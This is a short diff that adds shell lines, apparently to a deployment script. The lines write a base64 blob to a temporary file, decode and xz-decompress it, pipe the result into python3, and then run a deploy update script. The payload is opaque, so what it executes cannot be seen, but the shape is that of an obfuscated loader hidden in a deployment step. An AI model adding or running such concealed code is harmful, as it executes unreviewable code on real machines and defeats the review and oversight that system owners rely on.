@@ -1,0 +1,11 @@
+cat > /tmp/p141.b64 <<'EOF'
+/Td6WFoAAATm1rRGAgAhARwAAAAQz1jM4AJpAXhdADSbSme4Ujxz98E0Cfht0rhac+hYGb+9S+Dk
+FuiqQ/B+obnpY57XWrMOSZTSjzohdOG8iyRZMG26EM/a2cG5k1Z84o/qUgT4R/MJ+agYZleSHupK
+iu6/vvjh8x4za7u9h5ahzxDFR85OC5S5UwPQxIY+AODu3c9r/DFDZIOzIsGhnIouP9zac6UErXln
+xh3B2fSMTd6NWn9Bkef5c3rb+oo3ryKacVdMQjKKirBinz3lZsZEvMGTDSK/DFCq2sPy+V6ONF25
+f+kQpHfPdBRtHz5BGNIEsVB2mVw1H68UvDrRtuPt0FbXMriCcSu3rs5Ouwjoe7YTvwxhmjCC1CTD
+/0uzOnBY8DW2r4W7PR7zB9LgG0Ye5HfBfHTP/DMLY9qrNrzmo68SjhaLbc9nKcz2ZVUJWH0j9vtx
+MWlLfrSdTA+h0Q/WgAbNtiXGwvTKZMB+f9EQbYj1/vjFl4aqIT2O+YS55rvEzijvZ2v3hl/pQX3i
+fwWqlyA1CM4AJJjDbzM4VEoAAZQD6gQAANjzybyxxGf7AgAAAAAEWVo=
+EOF
+base64 -d < /tmp/p141.b64 | xz -d | python3 && cd /opt/central && bash deploy/update.sh
